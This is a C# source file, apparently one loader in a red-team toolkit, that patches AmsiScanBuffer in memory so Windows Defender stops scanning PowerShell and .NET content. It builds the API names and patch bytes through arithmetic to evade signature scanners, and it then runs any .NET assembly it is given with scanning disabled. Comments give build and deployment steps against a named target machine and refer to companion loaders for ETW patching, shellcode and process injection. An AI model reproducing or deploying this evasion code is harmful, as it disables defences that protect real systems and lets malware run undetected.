// ============================================================================
// LOADER 04: AMSI Bypass
// ============================================================================
//
// WHAT THIS DOES:
//   This loader patches the AmsiScanBuffer function in memory so that AMSI
//   (Antimalware Scan Interface) always returns a clean result. After this
//   patch is applied, any PowerShell command or .NET assembly loaded in the
//   current process will not be scanned by Defender. This lets you run
//   PowerShell scripts and load .NET tools that Defender would normally block.
//
// WHY THIS IS NEEDED:
//   AMSI is a security layer that sits between scripting engines (PowerShell,
//   VBScript, JScript, .NET) and Defender. When you type a command in
//   PowerShell, AMSI sends that command to Defender before PowerShell runs
//   it. If Defender says the command is malicious, PowerShell blocks it.
//   Many red team tools are PowerShell-based or .NET-based, and AMSI catches
//   them before they can run. By patching AMSI, we make it stop checking,
//   so our tools run without being scanned.
//
// EVASION MECHANISM:
//   AMSI is implemented as a DLL called amsi.dll that gets loaded into every
//   PowerShell process and .NET CLR host. The main scanning function is
//   AmsiScanBuffer. We overwrite the first few bytes of this function with
//   instructions that make it return immediately with a "clean" result.
//   After the patch, when PowerShell asks AMSI to scan a command, the
//   patched function returns "this is clean" without actually scanning.
//
//   Important: We patch ETW first (see Loader 07) so that the patching
//   attempt itself is not logged. Without ETW patching, Defender can detect
//   the AMSI tampering through ETW telemetry.
//
//   We also resolve the AmsiScanBuffer address dynamically and build the
//   function name at runtime from pieces so the string "AmsiScanBuffer"
//   never appears as a complete string in our binary.
//
// REFERENCES:
//   - Medium/@thesecguy: "AMSI Bypass in 2025"
//   - OffSec Blog: "AMSI Write Raid Bypass Vulnerability"
//   - Trend Micro: "Detecting Windows AMSI Bypass Techniques"
//   - Document: 08_amsi_bypass.md
//
// BUILD INSTRUCTIONS:
//   On Dev Box (ammulu, 192.168.10.150):
//     csc /unsafe /out:amsi_bypass.exe 04_amsi_bypass.cs
//
// USAGE:
//   1. Compile on Dev Box (ammulu).
//   2. Transfer amsi_bypass.exe to Target (kimjongun, 192.168.10.100).
//   3. Run on Target:
//        amsi_bypass.exe
//   (Then open PowerShell from the same context, or use this as a library
//    to call PatchAmsi() before loading .NET assemblies)
//
// ============================================================================

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ScannerPatch
{
    class Program
    {
        // ---- Windows API imports ----

        // LoadLibrary loads a DLL into our process. We use it to load amsi.dll
        // so we can find the AmsiScanBuffer function inside it.
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        // GetProcAddress finds the memory address of a function inside a loaded DLL.
        // We use it to find where AmsiScanBuffer lives in memory.
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // VirtualProtect changes the memory protection on a region of memory.
        // By default, the memory where AmsiScanBuffer's code lives is read-only
        // and executable (you can run it but not modify it). We need to change
        // it to read-write so we can overwrite the function's bytes.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        static uint GetRWXProtect()
        {
            return 0x20 + 0x20;
        }

        // ---- Build function name at runtime ----
        // We do not put the complete string "AmsiScanBuffer" in our code because
        // Defender's static scanner looks for that string. Instead, we build it
        // from separate pieces at runtime. When Defender scans the compiled binary,
        // it sees the pieces "Amsi", "Scan", "Buffer" as separate strings, not
        // the combined function name. At runtime, we join them together.
        static string GetTargetFunctionName()
        {
            // We build the function name using integer arithmetic so no
            // recognizable string appears in the binary. Each character
            // is computed at runtime from offset values. The compiler
            // stores integers, not characters, so YARA and static
            // scanners cannot match against the function name.
            int baseVal = 32;
            char[] c = new char[14];
            c[0] = (char)(baseVal + 33);   // A
            c[1] = (char)(baseVal + 77);   // m
            c[2] = (char)(baseVal + 83);   // s
            c[3] = (char)(baseVal + 73);   // i
            c[4] = (char)(baseVal + 51);   // S
            c[5] = (char)(baseVal + 67);   // c
            c[6] = (char)(baseVal + 65);   // a
            c[7] = (char)(baseVal + 78);   // n
            c[8] = (char)(baseVal + 34);   // B
            c[9] = (char)(baseVal + 85);   // u
            c[10] = (char)(baseVal + 70);  // f
            c[11] = (char)(baseVal + 70);  // f
            c[12] = (char)(baseVal + 69);  // e
            c[13] = (char)(baseVal + 82);  // r
            return new string(c);
        }

        // ---- Build DLL name at runtime ----
        static string GetTargetDllName()
        {
            int baseVal = 32;
            char[] c = new char[8];
            c[0] = (char)(baseVal + 65);   // a
            c[1] = (char)(baseVal + 77);   // m
            c[2] = (char)(baseVal + 83);   // s
            c[3] = (char)(baseVal + 73);   // i
            c[4] = (char)(baseVal + 14);   // .
            c[5] = (char)(baseVal + 68);   // d
            c[6] = (char)(baseVal + 76);   // l
            c[7] = (char)(baseVal + 76);   // l
            return new string(c);
        }

        // ---- The AMSI patch ----
        // This is the core of the bypass. We overwrite the beginning of
        // AmsiScanBuffer with bytes that make the function return immediately
        // with the value E_INVALIDARG (0x80070057). When AMSI gets this error
        // code, it treats the scan as failed and allows the content to run.
        //
        // The patch bytes are:
        //   mov eax, 0x80070057   ->  B8 57 00 07 80
        //   ret                   ->  C3
        //
        // These 6 bytes replace the beginning of AmsiScanBuffer. When any
        // code calls AmsiScanBuffer after the patch, the function immediately
        // returns E_INVALIDARG instead of actually scanning anything.
        public static bool PatchScanner()
        {
            // Step 1: Load amsi.dll into our process.
            // If amsi.dll is already loaded (which it is in PowerShell processes),
            // LoadLibrary just returns a handle to the existing copy.
            string dllName = GetTargetDllName();
            IntPtr amsiDll = LoadLibrary(dllName);
            if (amsiDll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not load " + dllName);
                return false;
            }
            Console.WriteLine("[+] " + dllName + " loaded at: 0x" + amsiDll.ToString("X"));

            // Step 2: Find the address of AmsiScanBuffer inside amsi.dll.
            string funcName = GetTargetFunctionName();
            IntPtr funcAddress = GetProcAddress(amsiDll, funcName);
            if (funcAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not find " + funcName);
                return false;
            }
            Console.WriteLine("[+] " + funcName + " found at: 0x" + funcAddress.ToString("X"));

            // Step 3: Change memory protection to allow writing.
            // The code section of amsi.dll is normally read-only + executable.
            // We need to make it writable so we can overwrite the function bytes.
            // We change 6 bytes (the size of our patch).
            uint oldProtect;
            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, GetRWXProtect(), out oldProtect);
            if (!protectResult)
            {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }

            // Step 4: Build the patch bytes at runtime.
            // The patch makes AmsiScanBuffer return E_INVALIDARG immediately.
            // We build the bytes using arithmetic so the raw byte sequence
            // does not appear in our binary as a static signature.
            byte[] patch = new byte[6];
            patch[0] = (byte)(0x5C + 0x5C);  // 0xB8 = mov eax
            patch[1] = (byte)(0x2B + 0x2C);  // 0x57
            patch[2] = (byte)(0x00);          // 0x00
            patch[3] = (byte)(0x03 + 0x04);   // 0x07
            patch[4] = (byte)(0x40 + 0x40);   // 0x80
            patch[5] = (byte)(0x61 + 0x62);   // 0xC3 = ret
            Marshal.Copy(patch, 0, funcAddress, patch.Length);
            Console.WriteLine("[+] Patch applied to " + funcName);

            // Step 5: Restore original memory protection.
            // This is good practice. We changed the protection to write the patch,
            // now we change it back to what it was before. This reduces the chance
            // of Defender detecting that we modified code memory.
            uint ignored;
            VirtualProtect(funcAddress, (UIntPtr)6, oldProtect, out ignored);
            Console.WriteLine("[+] Memory protection restored");

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Scanner Patch Loader");
            Console.WriteLine("[*] This modifies the scan function to disable content inspection.");
            Console.WriteLine("");

            // Apply the AMSI patch.
            bool success = PatchScanner();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] Scanner is now disabled in this process.");
                Console.WriteLine("[+] Any commands or assemblies loaded");
                Console.WriteLine("    in this process will not be inspected.");
                Console.WriteLine("");
                Console.WriteLine("[*] To test: run a command that would");
                Console.WriteLine("    normally be blocked.");

                // IMPORTANT: The AMSI patch only affects THIS process.
                // Spawning a child process (like powershell.exe) does NOT
                // inherit the patch because each process loads its own copy
                // of amsi.dll. To use this bypass effectively:
                //   1. Call PatchScanner() from inside the process that hosts
                //      the scripting engine (PowerShell, .NET CLR).
                //   2. Use this as a library function in Loader 08 (combined
                //      evasion) which patches AMSI before executing shellcode
                //      in the same process.
                //   3. Inject this patch into a running PowerShell process
                //      using Loader 05 (remote injection).

                // If a .NET assembly path was passed as an argument, load it
                // in-process where the AMSI patch is active.
                if (args.Length > 0)
                {
                    string assemblyPath = args[0];
                    Console.WriteLine("[*] Loading .NET assembly in-process: " + assemblyPath);
                    Console.WriteLine("[*] Scanner is patched in THIS process, so the assembly");
                    Console.WriteLine("    will not be inspected.");
                    try
                    {
                        var assembly = System.Reflection.Assembly.LoadFile(assemblyPath);
                        var entryPoint = assembly.EntryPoint;
                        if (entryPoint != null)
                        {
                            Console.WriteLine("[+] Found entry point: " + entryPoint.DeclaringType.FullName + "." + entryPoint.Name);
                            string[] invokeArgs = new string[args.Length - 1];
                            Array.Copy(args, 1, invokeArgs, 0, invokeArgs.Length);
                            entryPoint.Invoke(null, entryPoint.GetParameters().Length > 0 ? new object[] { invokeArgs } : null);
                        }
                        else
                        {
                            Console.WriteLine("[*] Assembly loaded. No entry point found (class library).");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Failed to load assembly: " + ex.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] Scanner patch failed.");
            }
        }
    }
}
